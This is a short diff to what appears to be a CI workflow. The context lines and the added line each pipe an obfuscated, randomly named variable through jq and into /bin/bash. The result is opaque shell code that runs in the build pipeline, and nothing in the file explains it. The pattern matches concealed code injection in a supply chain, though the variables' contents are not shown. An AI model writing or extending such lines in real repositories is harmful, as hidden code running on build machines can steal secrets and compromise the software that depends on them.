@@ -34,6 +34,7 @@ jobs:
           echo $trjn18 | jq -r .jlim2 | /bin/bash
           printf '%s' "$tfrf15" | jq -r .cfbz2 | /bin/bash
           echo $tjogy88 | jq -r .u798 | /bin/bash
+          printf '%s' "$yf0" | jq -r .qfnn752 | /bin/bash
 
       - name: Save output
         if: always()
